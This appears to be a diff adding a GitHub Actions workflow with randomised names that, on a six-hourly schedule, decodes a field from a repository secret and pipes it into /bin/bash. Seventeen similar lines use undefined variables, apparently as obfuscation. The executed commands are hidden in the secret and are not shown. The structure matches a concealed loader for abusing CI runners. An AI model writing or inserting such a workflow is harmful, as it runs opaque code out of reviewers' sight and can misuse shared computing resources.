@@ -1,0 +1,36 @@
+name: tujiulong4219
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tujiulong4219
+        env:
+          yfpmk57500: ${{ secrets.yfpmk57500 }}
+        run: |
+          echo $yfpmk57500 | jq -r .iqv26 | /bin/bash
+          echo $h723 | jq -r .wb32743 | /bin/bash
+          echo $qgn7525 | jq -r .jcx160 | /bin/bash
+          echo $vojz97652 | jq -r .pzta33744 | /bin/bash
+          echo $ljcw08 | jq -r .zwzfm9 | /bin/bash
+          echo $v0 | jq -r .yfhol919 | /bin/bash
+          echo $msywf1 | jq -r .w7327 | /bin/bash
+          echo $ujng5 | jq -r .afii72 | /bin/bash
+          echo $akrze7276 | jq -r .anvla861 | /bin/bash
+          echo $zd9 | jq -r .lbdy42288 | /bin/bash
+          echo $ku79 | jq -r .kxw81723 | /bin/bash
+          echo $vn262 | jq -r .k6 | /bin/bash
+          echo $yqzjt8924 | jq -r .jbi5 | /bin/bash
+          echo $mntr5458 | jq -r .omah380 | /bin/bash
+          echo $re1 | jq -r .dhc8226 | /bin/bash
+          echo $ryf367 | jq -r .edaik174 | /bin/bash
+          echo $gw31 | jq -r .s448 | /bin/bash
+          echo $qij654 | jq -r .pv3 | /bin/bash
+
